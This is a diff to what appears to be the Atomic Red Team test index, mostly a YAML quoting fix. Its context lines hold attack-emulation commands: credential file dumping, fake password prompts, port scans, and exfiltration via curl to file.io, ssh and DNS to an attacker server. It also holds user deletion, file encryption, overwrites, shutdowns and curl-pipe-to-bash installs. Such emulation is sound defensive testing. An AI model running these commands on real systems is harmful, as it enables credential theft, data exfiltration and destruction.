+'
       supported_platforms:
       - linux
       - macos
@@ -48872,7 +48872,7 @@ credential-access:
       description: 'This test looks for .netrc files (which stores github credentials
         in clear text )and dumps its contents if found.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -48887,13 +48887,13 @@ credential-access:
         command: 'for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do
           echo $file ; cat $file ; done
 
-          '
+'
     - name: Find Azure credentials
       auto_generated_guid: a8f6148d-478a-4f43-bc62-5efee9f931a4
       description: 'Find local Azure credentials from file, defaults to using / as
         the look path.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -48906,14 +48906,14 @@ credential-access:
         command: 'find #{file_path}/.azure -name "msal_token_cache.json" -o -name
           "accessTokens.json" -type f 2>/dev/null
 
-          '
+'
         name: sh
     - name: Find GCP credentials
       auto_generated_guid: aa12eb29-2dbb-414e-8b20-33d34af93543
       description: 'Find local Google Cloud Platform credentials from file, defaults
         to using / as the look path.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -48926,14 +48926,14 @@ credential-access:
         command: 'find #{file_path}/.config/gcloud -name "credentials.db" -o -name
           "access_tokens.db" -type f 2>/dev/null
 
-          '
+'
         name: sh
     - name: Find OCI credentials
       auto_generated_guid: 9d9c22c9-fa97-4008-a204-478cf68c40af
       description: 'Find local Oracle cloud credentials from file, defaults to using
         / as the look path.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -48945,7 +48945,7 @@ credential-access:
       executor:
         command: 'find #{file_path}/.oci/sessions -name "token" -type f 2>/dev/null
 
-          '
+'
         name: sh
   T1606.001:
     technique:
@@ -49618,7 +49618,7 @@ credential-access:
           to apply changes." & return & return  default answer "" with icon 1 with
           hidden answer with title "Software Update"''
 
-          '
+'
         name: bash
     - name: AppleScript - Spoofing a credential prompt using osascript
       auto_generated_guid: b7037b89-947a-427a-ba29-e7e9f09bc045
@@ -49785,7 +49785,7 @@ credential-access:
       description: 'Using username,password combination from a password dump to login
         over SSH.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -49797,11 +49797,11 @@ credential-access:
       dependencies:
       - description: 'Requires SSHPASS
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v sshpass)" ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: |
           /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)"
           brew install hudochenkov/sshpass/sshpass
@@ -51277,7 +51277,7 @@ discovery:
       description: 'Check internet connection using ping on Linux, MACOS. The default
         target of the ping is 8.8.8.8 (Google Public DNS).
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -51291,7 +51291,7 @@ discovery:
         elevation_required: false
         command: 'ping -c 4 #{ping_target}
 
-          '
+'
   T1069:
     technique:
       type: attack-pattern
@@ -51537,26 +51537,26 @@ discovery:
       description: 'Displays a list of loaded kernel extensions (kexts) on a macOS
         system.
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'kextstat
 
-          '
+'
         name: bash
         elevation_required: false
     - name: Find Kernel Extensions (macOS)
       auto_generated_guid: c63bbe52-6f17-4832-b221-f07ba8b1736f
       description: 'Searches for kernel extension (kext) files on a macOS system.
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'kextfind
 
-          '
+'
         name: bash
         elevation_required: false
   T1087.002:
@@ -51689,14 +51689,14 @@ discovery:
           cat #{output_file}
         cleanup_command: 'rm -f #{output_file}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: View accounts with UID 0
       auto_generated_guid: c955a599-3653-4fe5-b631-f11c00eb0397
       description: 'View accounts with UID 0
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -51712,29 +51712,29 @@ discovery:
           cat #{output_file} 2>/dev/null
         cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
-          '
+'
         name: sh
     - name: List opened files by user
       auto_generated_guid: 7e46c7a5-0142-45be-a858-1a3ecb4fd3cb
       description: 'List opened files by user
 
-        '
+'
       supported_platforms:
       - linux
       - macos
       executor:
         command: 'username=$(id -u -n) && lsof -u $username
 
-          '
+'
         name: sh
       dependency_executor_name: sh
       dependencies:
       - description: 'check if lsof exists
 
-          '
+'
         prereq_command: 'which lsof
 
-          '
+'
         get_prereq_command: "(which pkg && pkg install -y lsof)||(which yum && yum
           -y install lsof)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get
           install -y lsof)\n"
@@ -51742,7 +51742,7 @@ discovery:
       auto_generated_guid: e6f36545-dc1e-47f0-9f48-7f730f54a02e
       description: 'Utilize groups and id to enumerate users and groups
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -51755,7 +51755,7 @@ discovery:
       auto_generated_guid: 319e9f6c-7a9e-432e-8c62-9385c803b6f2
       description: 'Utilize local utilities to enumerate users and groups
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -51855,7 +51855,7 @@ discovery:
         the system. If it''s a virtual machine, one of the device manufacturer will
         be a Virtualization Software.
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -51865,7 +51865,7 @@ discovery:
           ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
           detected''; fi;
 
-          '
+'
     - name: Detect Virtualization Environment using sysctl (hw.model)
       auto_generated_guid: 6beae646-eb4c-4730-95be-691a4094408c
       description: |
@@ -51879,7 +51879,7 @@ discovery:
         command: 'if [ "$(sysctl -n hw.model | grep -v ''Mac'')" != "" ]; then echo
           ''Virtualization Environment detected''; fi;
 
-          '
+'
     - name: Check if System Integrity Protection is enabled
       auto_generated_guid: 2b73cd9b-b2fb-4357-b9d7-c73c41d9e945
       description: "The latest versions of macOS have the System Integrity Protection
@@ -51893,7 +51893,7 @@ discovery:
         command: 'if [ "$(csrutil status | grep -v ''enabled'')" != "" ]; then echo
           ''Possible Virtualization Environment detected''; fi;
 
-          '
+'
     - name: Detect Virtualization Environment using system_profiler
       auto_generated_guid: e04d2e89-de15-4d90-92f9-a335c7337f0f
       description: "system_profiler provides system hardware and software configuration
@@ -51908,7 +51908,7 @@ discovery:
           | grep -v ''Mac'')" != "" ]; then echo ''Virtualization Environment detected'';
           fi;
 
-          '
+'
   T1069.002:
     technique:
       type: attack-pattern
@@ -52115,11 +52115,11 @@ discovery:
       dependencies:
       - description: 'Check if at least one of tcpdump or tshark is installed.
 
-          '
+'
         prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
@@ -52132,7 +52132,7 @@ discovery:
       description: 'Opens a /dev/bpf file (O_RDONLY) and captures packets for a few
         seconds.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -52152,20 +52152,20 @@ discovery:
       dependencies:
       - description: 'compile C program
 
-          '
+'
         prereq_command: 'exit 1
 
-          '
+'
         get_prereq_command: 'cc #{csource_path} -o #{program_path}
 
-          '
+'
       executor:
         command: 'sudo #{program_path} -i #{ifname} -t 3
 
-          '
+'
         cleanup_command: 'rm -f #{program_path}
 
-          '
+'
         name: bash
         elevation_required: true
     - name: Filtered Packet Capture macOS using /dev/bpfN with sudo
@@ -52173,7 +52173,7 @@ discovery:
       description: 'Opens a /dev/bpf file (O_RDONLY), sets BPF filter for ''udp''
         and captures packets for a few seconds.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -52193,20 +52193,20 @@ discovery:
       dependencies:
       - description: 'compile C program
 
-          '
+'
         prereq_command: 'exit 1
 
-          '
+'
         get_prereq_command: 'cc #{csource_path} -o #{program_path}
 
-          '
+'
       executor:
         command: 'sudo #{program_path} -f -i #{ifname} -t 3
 
-          '
+'
         cleanup_command: 'rm -f #{program_path}
 
-          '
+'
         name: bash
         elevation_required: true
   T1135:
@@ -52268,7 +52268,7 @@ discovery:
       auto_generated_guid: f94b5ad9-911c-4eff-9718-fd21899db4f7
       description: 'Network Share Discovery
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -52431,7 +52431,7 @@ discovery:
       auto_generated_guid: edff98ec-0f73-4f63-9890-6b117092aff6
       description: 'Identify System Info
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -52443,7 +52443,7 @@ discovery:
       auto_generated_guid: cccb070c-df86-4216-a5bc-9fb60c74e27c
       description: 'Identify System Info
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -52461,34 +52461,34 @@ discovery:
           #{output_file} 2>/dev/null\n"
         cleanup_command: 'rm #{output_file} 2>/dev/null
 
-          '
+'
         name: sh
     - name: Hostname Discovery
       auto_generated_guid: 486e88ea-4f56-470f-9b57-3f4d73f39133
       description: 'Identify system hostname for FreeBSD, Linux and macOS systems.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
       executor:
         command: 'hostname
 
-          '
+'
         name: sh
     - name: Environment variables discovery on freebsd, macos and linux
       auto_generated_guid: fcbdd43f-f4ad-42d5-98f3-0218097e2720
       description: 'Identify all environment variables. Upon execution, environments
         variables and your path info will be displayed.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
       executor:
         command: 'env
 
-          '
+'
         name: sh
     - name: Show System Integrity Protection status (MacOS)
       auto_generated_guid: 327cc050-9e99-4c8e-99b5-1d15f2fb6b96
@@ -52496,13 +52496,13 @@ discovery:
         is commonly used by malware and post-exploitation tools to determine whether
         certain files and directories on the system are writable or not.
 
-        '
+'
       supported_platforms:
       - macos
       executor:
         command: 'csrutil status
 
-          '
+'
         name: sh
     - name: sysctl to gather macOS hardware info
       auto_generated_guid: c8d40da9-31bd-47da-a497-11ea55d1ef6c
@@ -52788,7 +52788,7 @@ discovery:
       description: 'Uses the ping command to introduce a delay before executing a
         malicious payload.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -52895,7 +52895,7 @@ discovery:
         Stratus Red Team is a self-contained binary. You can use it to easily detonate
         offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -52913,11 +52913,11 @@ discovery:
       dependencies:
       - description: 'Stratus binary must be present at the (#{stratus_path}/stratus)
 
-          '
+'
         prereq_command: 'if test -f "#{stratus_path}/stratus"; then exit 0; else exit
           1; fi
 
-          '
+'
         get_prereq_command: "if [ \"$(uname)\" = \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl
           -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
           | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4);
@@ -52931,14 +52931,14 @@ discovery:
           \n"
       - description: 'Check if ~/.aws/credentials file has a default stanza is configured
 
-          '
+'
         prereq_command: 'cat ~/.aws/credentials | grep "default"
 
-          '
+'
         get_prereq_command: 'echo "Please install the aws-cli and configure your AWS
           default profile using: aws configure"
 
-          '
+'
       executor:
         command: |
           export AWS_REGION=#{aws_region}
@@ -53012,7 +53012,7 @@ discovery:
       description: 'Searches for Mozilla Firefox''s places.sqlite file (on macOS)
         that contains bookmarks and lists any found instances to a text file.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -53026,14 +53026,14 @@ discovery:
           cat #{output_file} 2>/dev/null
         cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
-          '
+'
         name: sh
     - name: List Google Chrome Bookmark JSON Files on macOS
       auto_generated_guid: b789d341-154b-4a42-a071-9111588be9bc
       description: 'Searches for Google Chrome''s Bookmark file (on macOS) that contains
         bookmarks in JSON format and lists any found instances to a text file.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -53047,14 +53047,14 @@ discovery:
           cat #{output_file} 2>/dev/null
         cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
-          '
+'
         name: sh
     - name: List Safari Bookmarks on MacOS
       auto_generated_guid: 5fc528dd-79de-47f5-8188-25572b7fafe0
       description: 'This test searches for Safari''s Bookmarks file (on macOS) and
         lists any found instances to a text file.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -53067,7 +53067,7 @@ discovery:
           \ncat #{output_file} \n"
         cleanup_command: 'rm -f #{output_file} 2>/dev/null
 
-          '
+'
         name: sh
   T1673:
     technique:
@@ -53208,11 +53208,11 @@ discovery:
       dependencies:
       - description: 'Check if arp command exists on the machine
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v arp)" ]; then exit 0; else exit 1;
           fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install net-tools)||(which apt-get
           && DEBIAN_FRONTEND=noninteractive apt-get install -y net-tools)\n"
       executor:
@@ -53454,13 +53454,13 @@ discovery:
           which sh
         cleanup_command: 'rm #{output_file}
 
-          '
+'
         name: sh
     - name: Nix File and Directory Discovery 2
       auto_generated_guid: 13c5e1ae-605b-46c4-a79f-db28c77ff24e
       description: 'Find or discover files on the file system
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -53575,7 +53575,7 @@ discovery:
           -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true;
           fi
 
-          '
+'
     - name: System Network Connections Discovery FreeBSD, Linux & MacOS
       auto_generated_guid: 9ae28d3f-190f-4fa0-b023-c7bd3e0eabf2
       description: |
@@ -53589,14 +53589,14 @@ discovery:
       dependencies:
       - description: 'Check if netstat command exists on the machine
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v netstat)" ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "Install netstat on the machine."; exit 1;
 
-          '
+'
       executor:
         command: |
           netstat
@@ -53920,7 +53920,7 @@ discovery:
           ps aux >> #{output_file}
         cleanup_command: 'rm #{output_file}
 
-          '
+'
         name: sh
   T1497.002:
     technique:
@@ -54035,7 +54035,7 @@ discovery:
       auto_generated_guid: 952931a4-af0b-4335-bbbe-73c8c5b327ae
       description: 'Permission Groups Discovery
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -54118,7 +54118,7 @@ discovery:
       auto_generated_guid: 4b7fa042-9482-45e1-b348-4b756b2a0742
       description: 'Lists the password policy to console on macOS.
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -54315,7 +54315,7 @@ discovery:
         The default URL of the IP-Lookup service is https://ipinfo.io/. References:
         https://securelist.com/transparent-tribe-part-1/98127/ and https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -54329,7 +54329,7 @@ discovery:
         elevation_required: false
         command: 'curl -k #{ip_lookup_url}
 
-          '
+'
   T1518.001:
     technique:
       type: attack-pattern
@@ -54382,7 +54382,7 @@ discovery:
       executor:
         command: 'ps aux | egrep ''Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu''
 
-          '
+'
         name: sh
   T1526:
     technique:
@@ -54527,17 +54527,17 @@ discovery:
       dependencies:
       - description: 'Check if arp command exists on the machine
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v arp)" ]; then exit 0; else exit 1;
           fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install net-tools)||(which apt-get
           && apt-get install -y net-tools)\n"
       executor:
         command: 'arp -a | grep -v ''^?''
 
-          '
+'
         name: sh
     - name: Remote System Discovery - sweep
       auto_generated_guid: 96db2632-8417-4dbb-b8bb-a8b92ba391de
@@ -54565,7 +54565,7 @@ discovery:
         command: 'for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip;
           [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
 
-          '
+'
         name: sh
   T1046:
     technique:
@@ -54651,7 +54651,7 @@ discovery:
         command: 'for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port)
           && echo port $port is open ; done
 
-          '
+'
         name: bash
     - name: Port Scan Nmap
       auto_generated_guid: 515942b0-a09f-4163-a7bb-22fefb6f185f
@@ -54678,30 +54678,30 @@ discovery:
       dependencies:
       - description: 'Check if nmap command exists on the machine
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1;
           fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install epel-release nmap)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which
           pkg && pkg install -y nmap)\n"
       - description: 'Check if nc command exists on the machine
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v nc)" ]; then exit 0; else exit 1; fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install epel-release nc)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which
           pkg && pkg install -y netcat)\n"
       - description: 'Check if telnet command exists on the machine
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v telnet)" ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install epel-release telnet)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)\n"
       executor:
@@ -54715,7 +54715,7 @@ discovery:
       auto_generated_guid: 0d5a2b03-3a26-45e4-96ae-89485b4d1f97
       description: 'Scan multiple ports to check for listening ports with nmap
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -54732,18 +54732,18 @@ discovery:
       dependencies:
       - description: 'Check if nmap command exists on the machine
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v nmap)" ]; then exit 0; else exit 1;
           fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install epel-release nmap)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which
           pkg && pkg install -y nmap)||(which brew && brew install nmap)\n"
       executor:
         command: 'nmap -Pn -sV -p #{port_range} #{host}
 
-          '
+'
         elevation_required: true
         name: sh
   T1518:
@@ -54793,7 +54793,7 @@ discovery:
         software that is installed on the system. Adversaries may use the information
         from Software Discovery during automated discovery to shape follow-on behaviors
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -55127,7 +55127,7 @@ discovery:
       executor:
         command: 'date
 
-          '
+'
         name: sh
 resource-development:
   T1583:
@@ -59917,7 +59917,7 @@ reconnaissance:
       description: 'This test will scan a target system with a wordlist of common
         directories and file paths.
 
-        '
+'
       supported_platforms:
       - windows
       - linux
@@ -61686,7 +61686,7 @@ impact:
       description: 'This test changes the user password to hinder access to the account
         using passwd utility.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -61699,14 +61699,14 @@ impact:
         command: 'passwd #{user_account} #enter admin password > enter new password
           > confirm new password
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Delete User via dscl utility
       auto_generated_guid: 4d938c43-2fe8-4d70-a5b3-5bf239aa7846
       description: 'This test deletes the user account using the dscl utility.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -61721,7 +61721,7 @@ impact:
       executor:
         command: 'dscl . -delete /Users/#{user_account} #enter admin password
 
-          '
+'
         cleanup_command: |
           dscl . -create /Users/#{user_account} #enter admin password
           dscl . -create /Users/#{user_account} UserShell /bin/bash
@@ -61734,7 +61734,7 @@ impact:
       auto_generated_guid: d3812c4e-30ee-466a-a0aa-07e355b561d6
       description: 'This test deletes the user account using the sysadminctl utility.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -61753,11 +61753,11 @@ impact:
       executor:
         command: 'sysadminctl -deleteUser #{user_account} #enter admin password
 
-          '
+'
         cleanup_command: 'sysadminctl -addUser #{user_account} -fullName "#{user_name}"
           -password #{user_password}
 
-          '
+'
         name: sh
         elevation_required: true
   T1486:
@@ -61882,17 +61882,17 @@ impact:
       auto_generated_guid: 645f0f5a-ef09-48d8-b9bc-f0e24c642d72
       description: 'This test encrypts the file(s) using the 7z utility
 
-        '
+'
       supported_platforms:
       - macos
       dependency_executor_name: sh
       dependencies:
       - description: 'Check if 7z command exists on the machine
 
-          '
+'
         prereq_command: 'which 7z
 
-          '
+'
         get_prereq_command: |
           echo Installing 7z, using brew
           /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
@@ -61913,17 +61913,17 @@ impact:
       executor:
         command: '7z a -p #{file_password} -mhe=on #{encrypted_file_name} #{input_file_path}
 
-          '
+'
         cleanup_command: 'rm #{encrypted_file_name}
 
-          '
+'
         name: sh
         elevation_required: false
     - name: Encrypt files using openssl utility - macOS
       auto_generated_guid: 1a01f6b8-b1e8-418e-bbe3-78a6f822759e
       description: 'This test encrypts the file(s) using the openssl utility
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -61942,10 +61942,10 @@ impact:
       executor:
         command: 'openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}
 
-          '
+'
         cleanup_command: 'rm #{output_file_name}
 
-          '
+'
         name: sh
         elevation_required: false
   T1667:
@@ -62164,7 +62164,7 @@ impact:
       executor:
         command: 'yes > /dev/null
 
-          '
+'
         name: sh
   T1565.002:
     technique:
@@ -62319,7 +62319,7 @@ impact:
         command: 'dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l
           #{file_to_overwrite} | awk ''{print $5}'') iflag=count_bytes
 
-          '
+'
         name: sh
   T1498:
     technique:
@@ -62558,7 +62558,7 @@ impact:
         software. Attackers can use this to prevent backups from occurring and hinder
         the victim''s ability to recover from any damage.
 
-        '
+'
       supported_platforms:
       - macos
       executor:
@@ -62730,7 +62730,7 @@ impact:
       auto_generated_guid: 6326dbc4-444b-4c04-88f4-27e94d0327cb
       description: 'This test restarts a FreeBSD/macOS/Linux system.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -62742,14 +62742,14 @@ impact:
       executor:
         command: 'shutdown -r #{timeout}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Shutdown System via `shutdown` - FreeBSD/macOS/Linux
       auto_generated_guid: 4963a81e-a3ad-4f02-adda-812343b351de
       description: 'This test shuts down a FreeBSD/macOS/Linux system using a halt.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -62761,21 +62761,21 @@ impact:
       executor:
         command: 'shutdown -h #{timeout}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Restart System via `reboot` - FreeBSD/macOS/Linux
       auto_generated_guid: 47d0b042-a918-40ab-8cf9-150ffe919027
       description: 'This test restarts a FreeBSD/macOS/Linux system via `reboot`.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
       executor:
         command: 'reboot
 
-          '
+'
         name: sh
         elevation_required: true
 initial-access:
@@ -64913,7 +64913,7 @@ exfiltration:
       auto_generated_guid: 4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01
       description: 'Exfiltrate data HTTPS using curl to file share site file.io
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -64928,7 +64928,7 @@ exfiltration:
         command: 'curl -F ''file=@#{input_file}'' -F ''maxDownloads=1'' -F ''autoDelete=true''
           https://file.io/
 
-          '
+'
   T1041:
     technique:
       type: attack-pattern
@@ -65058,7 +65058,7 @@ exfiltration:
       executor:
         command: 'ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
 
-          '
+'
         name: sh
     - name: Exfiltration Over Alternative Protocol - SSH
       auto_generated_guid: 7c3cb337-35ae-4d06-bf03-3032ed2ec268
@@ -65088,7 +65088,7 @@ exfiltration:
         command: 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh
           #{user_name}@#{domain} ''cat > /Users.tar.gz.enc''
 
-          '
+'
         name: sh
     - name: Exfiltrate Data using DNS Queries via dig
       auto_generated_guid: a27916da-05f2-4316-a3ee-feec67a437be
@@ -65121,12 +65121,12 @@ exfiltration:
           && sudo pkg update && sudo pkg install -y bind-tools || which brew && brew
           update && brew install --quiet bind
 
-          '
+'
       executor:
         command: 'dig @#{attacker_dns_server} -p #{dns_port} $(echo "#{secret_info}"
           | base64).google.com
 
-          '
+'
         name: bash
         elevation_required: false
   T1052.001:
@@ -65300,10 +65300,10 @@ exfiltration:
       dependencies:
       - description: 'rclone must exist at (#{rclone_path})
 
-          '
+'
         prereq_command: 'if (Test-Path "#{rclone_path}") {exit 0} else {exit 1}
 
-          '
+'
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder/../ExternalPayloads/" -ErrorAction Ignore -Force | Out-Null
           $arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
@@ -65317,7 +65317,7 @@ exfiltration:
       - description: terraform must exist at (#{terraform_path})
         prereq_command: 'if (Test-Path "#{terraform_path}") {exit 0} else {exit 1}
 
-          '
+'
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder/../ExternalPayloads/" -ErrorAction Ignore -Force | Out-Null
           $arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
@@ -65331,10 +65331,10 @@ exfiltration:
       - description: 'Must provide a valid directory or file path to exfiltrate to
           AWS S3
 
-          '
+'
         prereq_command: 'if (Test-Path "#{exfil_directory}") {exit 0} else {exit 1}
 
-          '
+'
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data" -ErrorAction Ignore -Force | Out-Null
           foreach($fileSuffix in 1..10) {
@@ -65430,7 +65430,7 @@ exfiltration:
       auto_generated_guid: ab936c51-10f4-46ce-9144-e02137b2016a
       description: 'Take a file/directory, split it into 5Mb chunks
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -65449,12 +65449,12 @@ exfiltration:
         prereq_command: 'if [ ! -f #{folder_path}/#{file_name} ]; then exit 1; else
           exit 0; fi;
 
-          '
+'
         get_prereq_command: 'if [ ! -d #{folder_path} ]; then mkdir -p #{folder_path};
           touch #{folder_path}/safe_to_delete; fi; dd if=/dev/urandom of=#{folder_path}/#{file_name}
           bs=25000000 count=1
 
-          '
+'
       executor:
         command: |
           cd #{folder_path}; split -b 5000000 #{file_name}
@@ -65462,7 +65462,7 @@ exfiltration:
         cleanup_command: 'if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path};
           fi;
 
-          '
+'
         name: sh
   T1537:
     technique:
